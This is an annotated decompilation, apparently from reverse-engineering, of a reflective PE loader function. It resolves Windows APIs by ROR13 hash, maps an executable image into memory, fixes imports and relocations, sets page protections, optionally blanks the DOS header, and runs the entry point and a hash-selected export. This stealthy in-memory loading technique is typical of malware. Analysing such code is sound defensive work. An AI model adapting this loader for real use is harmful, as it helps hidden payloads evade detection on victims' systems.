
byte * loadBinary(byte *pe_ptr,byte *functionToRunHash,byte *functionToRunParam1,
                 int functionToRunParam2,int copyDosHeader)

{
  int iVar1;
  ushort relocType;
  LoadLibraryA *LoadLibraryA_Ptr;
  GetProcAddress *GetProcAddress_Ptr;
  VirtualAlloc *VirtualAlloc_Ptr;
  GetNativeSystemInfo *GetNativeSystemInfo_Ptr;
  byte *buf;
  uint numOfSections2;
  int library;
  int newFirstThunk;
  uint numOfEntries;
  uint numOfSections3;
  int res;
  int *VirtualAddress_Ptr;
  byte *dst1;
  int *PointerToRawData_Ptr;
  uint entry;
  IMAGE_EXPORT_DIRECTORY *imageExportDirectory;
  uint numOfSections;
  uint j;
  byte *dst2;
  uint mem_read;
  byte *hash;
  DWORD sizeOfHeaders;
  int l;
  int *FirstThunk_Ptr;
  byte *bufMinusImageBase;
  uint *SectionFlags_Ptr;
  char **namePtr;
  uint calculatedSizeOfImage;
  byte *src1;
  byte *src2;
  IMAGE_IMPORT_DESCRIPTOR *imageImportDescriptor;
  byte *dstRelocBlockPtr;
  char *c_ptr;
  IMAGE_NT_HEADERS32 *unaff_EDI;
  IMAGE_NT_HEADERS32 *pe_header;
  ushort *entryPtr;
  IMAGE_NT_HEADERS32 *nt_header;
  ushort *nameOrdinal;
  undefined4 flOldProtect;
  byte *VirtualProtect_Ptr;
  byte *NtFlushInstructionCache_Ptr;
  SYSTEM_INFO systemInfo;
  byte c;
  DWORD sectionSize;
  DWORD addressOfEntryPoint;
  uint sectionFlags;
  IMAGE_EXPORT_DIRECTORY *exportDirectory;
  uint importLookupTableRVA;
  DWORD importNameOffset;
  FARPROC pFVar1;
  int *relocBlockSize_Ptr;
  SIZE_T sizeOfImage;
  
  flOldProtect = 0;
  calculatedSizeOfImage = 0;
  LoadLibraryA_Ptr = (LoadLibraryA *)resolveImportByHash(kernel32_dll__LoadLibraryA);
  GetProcAddress_Ptr = (GetProcAddress *)resolveImportByHash(kernel32_dll__GetProcAddress);
  VirtualAlloc_Ptr = (VirtualAlloc *)resolveImportByHash(kernel32_dll__VirtualAlloc);
  VirtualProtect_Ptr = (byte *)resolveImportByHash(kernel32_dll__VirtualProtect);
  NtFlushInstructionCache_Ptr = (byte *)resolveImportByHash(ntdll_dll__NtFlushInstructionCache);
  GetNativeSystemInfo_Ptr =
       (GetNativeSystemInfo *)resolveImportByHash(kernel32_dll__GetNativeSystemInfo);
                    /* CHECK PE_HEADER MAGIC VALUES */
  pe_header = (IMAGE_NT_HEADERS32 *)(pe_ptr + *(int *)(pe_ptr + 0x3c));
  if (((pe_header->Signature == 0x4550) && ((pe_header->FileHeader).Machine == 0x14c)) &&
     ((*(byte *)&(pe_header->OptionalHeader).SectionAlignment & 1) == 0)) {
                    /* CALCULATE IMAGE SIZE FROM SECTION HEADERS */
    numOfSections = (uint)(pe_header->FileHeader).NumberOfSections;
    if (numOfSections != 0) {
                    /* ImageSectionHeader:[0x0c] VirtualAddress
                       ImageSectionHeader:[0x10] SizeOfRawData */
      VirtualAddress_Ptr =
           (int *)((int)(pe_header->OptionalHeader).DataDirectory +
                  ((pe_header->FileHeader).SizeOfOptionalHeader - 0x54));
      do {
                    /* actually SizeOfRawData */
        if (VirtualAddress_Ptr[1] == 0) {
          sectionSize = (pe_header->OptionalHeader).SectionAlignment;
        }
        else {
          sectionSize = VirtualAddress_Ptr[1];
        }
        if (calculatedSizeOfImage < *VirtualAddress_Ptr + sectionSize) {
          calculatedSizeOfImage = *VirtualAddress_Ptr + sectionSize;
        }
        VirtualAddress_Ptr = VirtualAddress_Ptr + 10;
        numOfSections = numOfSections - 1;
      } while (numOfSections != 0);
    }
    (*GetNativeSystemInfo_Ptr)((LPSYSTEM_INFO)&systemInfo);
    sizeOfImage = (pe_header->OptionalHeader).SizeOfImage;
                    /* confirm that aligned SizeOfImage matches aligned calculatedImageSize */
    if (((systemInfo.dwPageSize - 1) + sizeOfImage & ~(systemInfo.dwPageSize - 1)) ==
        ((systemInfo.dwPageSize - 1) + calculatedSizeOfImage & ~(systemInfo.dwPageSize - 1))) {
      buf = (byte *)(*VirtualAlloc_Ptr)((LPVOID)0x0,sizeOfImage,0x3000,4);
                    /* COPY HEADERS */
      sizeOfHeaders = (pe_header->OptionalHeader).SizeOfHeaders;
      j = 0;
      if (sizeOfHeaders != 0) {
        dst1 = buf;
        src1 = pe_ptr;
        do {
          sizeOfHeaders = sizeOfHeaders - 1;
                    /* If copyDosHeader is set OR copying actual IMAGE_NT_HEADERS32 OR copying
                       e_lfanew */
          if ((((copyDosHeader & 1U) == 0) ||
              ((IMAGE_NT_HEADERS32 *)((int)pe_header - (int)pe_ptr) <= j)) ||
             (((IMAGE_NT_HEADERS32 *)0x3b < j && (j < (IMAGE_NT_HEADERS32 *)0x3f)))) {
            *dst1 = *src1;
          }
          else {
            *dst1 = 0;
          }
          dst1 = dst1 + 1;
          src1 = src1 + 1;
          j = (int)(DWORD *)j + 1;
        } while (sizeOfHeaders != 0);
      }
                    /* COPY SECTIONS */
      numOfSections2 = (uint)(pe_header->FileHeader).NumberOfSections;
      hash = pe_ptr;
      if (numOfSections2 != 0) {
                    /* SectionHeader:[0x14] PointerToRawData
                       SectionHeader:[0x10] SizeOfRawData
                       SectionHeader:[0x0c] VirtualAddress
                        */
        PointerToRawData_Ptr =
             (int *)((int)(pe_header->OptionalHeader).DataDirectory +
                    ((pe_header->FileHeader).SizeOfOptionalHeader - 0x4c));
        do {
          numOfSections2 = numOfSections2 + -1;
                    /* VirtualAddress */
          dst2 = buf + PointerToRawData_Ptr[-2];
                    /* SizeOfRawData */
          l = PointerToRawData_Ptr[-1];
                    /* e_res offset = 0x1c */
          src2 = pe_ptr + *PointerToRawData_Ptr;
          while (l != 0) {
            *dst2 = *src2;
            dst2 = dst2 + 1;
            src2 = src2 + 1;
            l = l + -1;
          }
          PointerToRawData_Ptr = PointerToRawData_Ptr + 10;
          hash = (byte *)numOfSections2;
        } while ((byte *)numOfSections2 != (byte *)0x0);
      }
      pe_ptr = hash;
      imageImportDescriptor =
           (IMAGE_IMPORT_DESCRIPTOR *)
           (buf + (pe_header->OptionalHeader).DataDirectory[1].VirtualAddress);
      importNameOffset = imageImportDescriptor->Name;
      while (importNameOffset != 0) {
                    /* LOAD AND LINK IMPORTS */
        library = (int)(*LoadLibraryA_Ptr)((LPCSTR)(buf + importNameOffset));
        FirstThunk_Ptr = (int *)(buf + imageImportDescriptor->FirstThunk);
        pe_ptr = buf + imageImportDescriptor->u;
        pFVar1 = (FARPROC)*FirstThunk_Ptr;
        while (pFVar1 != (FARPROC)0x0) {
          importLookupTableRVA = *(uint *)pe_ptr;
                    /* If import by name */
          if ((importLookupTableRVA == 0) || (-1 < (int)importLookupTableRVA)) {
                    /* FirstThunk is identical to ImportLookupTableRVA at this point
                       Since Ordinal/Name Flag (bit 31) is set to 0
                       bits 0-30 contain RVA to the Hint/Name table.
                       At offset 2 we have the Name to import */
            newFirstThunk =
                 (int)(*GetProcAddress_Ptr)
                                ((HMODULE)library,
                                 (LPCSTR)(buf + (int)((FARPROC)*FirstThunk_Ptr + 2)));
          }
          else {
                    /* If import by ordinal
                       
                       IMAGE_DOS_HEADER:[0x3c] e_lfanew
                       IMAGE_NT_HEADER:[0x78] DataDirectory[0] */
            exportDirectory =
                 *(IMAGE_EXPORT_DIRECTORY **)(*(int *)(library + 0x3c) + 0x78 + library);
                    /* Since Ordinal/Name Flag (bit 31) is set to 0
                       bits 0-15 contain the OrdinalNumber */
            newFirstThunk =
                 *(int *)(*(int *)((int)&exportDirectory->AddressOfFunctions + library) +
                          ((importLookupTableRVA & 0xffff) -
                          *(int *)((int)&exportDirectory->Base + library)) * 4 + library) + library;
          }
          *FirstThunk_Ptr = newFirstThunk;
          FirstThunk_Ptr = (int *)((FARPROC *)FirstThunk_Ptr + 1);
          pe_ptr = (byte *)((int)pe_ptr + 4);
          pFVar1 = (FARPROC)*FirstThunk_Ptr;
        }
        importNameOffset = imageImportDescriptor[1].Name;
        imageImportDescriptor = imageImportDescriptor + 1;
      }
                    /* APPLY RELOCATIONS */
      bufMinusImageBase = buf + -(pe_header->OptionalHeader).ImageBase;
      if ((pe_header->OptionalHeader).DataDirectory[5].Size != 0) {
        pe_ptr = buf + (pe_header->OptionalHeader).DataDirectory[5].VirtualAddress;
        relocBlockSize_Ptr = (int *)((int)pe_ptr + 4);
        iVar1 = *relocBlockSize_Ptr;
        while (iVar1 != 0) {
          entryPtr = (ushort *)((int)pe_ptr + 8);
          dstRelocBlockPtr = buf + *(int *)pe_ptr;
          numOfEntries = iVar1 - 8U >> 1;
          while (numOfEntries != 0) {
            entry = (uint)*entryPtr;
            numOfEntries = numOfEntries - 1;
            relocType = *entryPtr >> 0xc;
                    /* IMAGE_REL_BASED_DIR64 or IMAGE_REL_BASED_HIGHLOW  */
            if ((relocType == 10) || (relocType == 3)) {
              *(byte **)(dstRelocBlockPtr + (entry & 0xfff)) =
                   bufMinusImageBase + (int)*(byte **)(dstRelocBlockPtr + (entry & 0xfff));
            }
            else {
                    /* IMAGE_REL_BASED_HIGH */
              if (relocType == 1) {
                *(short *)(dstRelocBlockPtr + (entry & 0xfff)) =
                     *(short *)(dstRelocBlockPtr + (entry & 0xfff)) +
                     (short)((uint)bufMinusImageBase >> 0x10);
              }
              else {
                    /* IMAGE_REL_BASED_LOW  */
                if (relocType == 2) {
                  *(short *)(dstRelocBlockPtr + (entry & 0xfff)) =
                       *(short *)(dstRelocBlockPtr + (entry & 0xfff)) + (short)bufMinusImageBase;
                }
              }
            }
            entryPtr = (ushort *)((int)entryPtr + 2);
          }
          pe_ptr = (byte *)((int)pe_ptr + *relocBlockSize_Ptr);
          relocBlockSize_Ptr = (int *)((int)pe_ptr + 4);
          iVar1 = *relocBlockSize_Ptr;
        }
      }
                    /* APPLY MEMORY PROTECTION ON SECTIONS */
      numOfSections3 = (uint)(pe_header->FileHeader).NumberOfSections;
      if (numOfSections3 != 0) {
                    /* SectionHeader:[0x24] SectionFlags
                       SectionHeader:[0x14] PointerToRawData
                       SectionHeader:[0x10] SizeOfRawData */
        SectionFlags_Ptr =
             (uint *)((int)(pe_header->OptionalHeader).DataDirectory +
                     ((pe_header->FileHeader).SizeOfOptionalHeader - 0x3c));
        do {
          numOfSections3 = numOfSections3 - 1;
          if (SectionFlags_Ptr[-5] != 0) {
                    /* IMAGE_SCN_MEM_READ 0x40000000 */
            mem_read = *SectionFlags_Ptr >> 0x1e & 1;
            sectionFlags = *SectionFlags_Ptr;
            if ((*SectionFlags_Ptr >> 0x1d & 1) == 0) {
                    /* if not IMAGE_SCN_MEM_EXECUTE (0x20000000) */
              if (mem_read == 0) {
                    /* PAGE_WRITECOPY */
                pe_ptr = (byte *)0x8;
                    /* PAGE_NOACCESS */
                hash = (byte *)0x1;
              }
              else {
                    /* PAGE_READWRITE */
                pe_ptr = (byte *)0x4;
                    /* PAGE_READONLY */
                hash = (byte *)0x2;
              }
                    /* if not IMAGE_SCN_MEM_WRITE */
              if (-1 < (int)sectionFlags) {
                pe_ptr = hash;
              }
            }
            else {
                    /* if IMAGE_SCN_MEM_EXECUTE (0x20000000) */
              if (mem_read == 0) {
                if ((int)sectionFlags < 0) {
                  if ((int)sectionFlags < 0) {
                    /* if IMAGE_SCN_MEM_WRITE */
                    pe_ptr = (byte *)0x80;
                    /* PAGE_EXECUTE_WRITECOPY */
                  }
                }
                else {
                  pe_ptr = (byte *)0x10;
                    /* PAGE_EXECUTE */
                }
              }
              else {
                if ((int)sectionFlags < 0) {
                    /* PAGE_EXECUTE_READWRITE */
                  if ((int)sectionFlags < 0) {
                    pe_ptr = (byte *)0x40;
                  }
                }
                else {
                    /* PAGE_EXECUTE_READ */
                  pe_ptr = (byte *)0x20;
                }
              }
            }
                    /* IMAGE_SCN_MEM_NOT_CACHED  */
            if ((*SectionFlags_Ptr & 0x4000000) != 0) {
                    /* PAGE_NOCACHE */
              pe_ptr = (byte *)((uint)pe_ptr | 0x200);
            }
            res = (*(code *)VirtualProtect_Ptr)
                            (buf + SectionFlags_Ptr[-6],SectionFlags_Ptr[-5],pe_ptr,&flOldProtect);
            if (res == 0) {
              return (byte *)0x0;
            }
          }
          SectionFlags_Ptr = SectionFlags_Ptr + 10;
        } while (numOfSections3 != 0);
      }
                    /* RUN THE ENTRYPOINT */
      addressOfEntryPoint = (pe_header->OptionalHeader).AddressOfEntryPoint;
      (*(code *)NtFlushInstructionCache_Ptr)(0xffffffff,0,0);
      (*(code *)(buf + addressOfEntryPoint))(buf,1,1);
      if (functionToRunHash == (byte *)0x0) {
        return buf;
      }
      if ((pe_header->OptionalHeader).DataDirectory[0].Size != 0) {
        imageExportDirectory =
             (IMAGE_EXPORT_DIRECTORY *)
             (buf + (pe_header->OptionalHeader).DataDirectory[0].VirtualAddress);
        if (imageExportDirectory->NumberOfNames == 0) {
          return buf;
        }
        if (imageExportDirectory->NumberOfFunctions != 0) {
          namePtr = (char **)(buf + imageExportDirectory->AddressOfNames);
          pe_ptr = (byte *)0x0;
          nameOrdinal = (ushort *)(buf + imageExportDirectory->AddressOfNameOrdinals);
          if (imageExportDirectory->NumberOfNames == 0) {
            return buf;
          }
          while( true ) {
            hash = (byte *)0x0;
            c_ptr = *namePtr + (int)buf;
            do {
              hash = (byte *)(((uint)hash >> 0xd | (int)hash << 0x13) + (int)*c_ptr);
              c = *c_ptr;
              c_ptr = c_ptr + 1;
            } while (c != 0);
            if (functionToRunHash == hash) break;
            namePtr = namePtr + 1;
            pe_ptr = pe_ptr + 1;
            nameOrdinal = nameOrdinal + 1;
            if ((byte *)imageExportDirectory->NumberOfNames <= pe_ptr) {
              return buf;
            }
          }
          if (*nameOrdinal != 0xffffffff) {
            (*(code *)(buf + *(int *)(buf + imageExportDirectory->AddressOfFunctions +
                                            (uint)*nameOrdinal * 4)))
                      (functionToRunParam1,functionToRunParam2);
            return buf;
          }
          return buf;
        }
        return buf;
      }
      return buf;
    }
  }
  return (byte *)0x0;
}

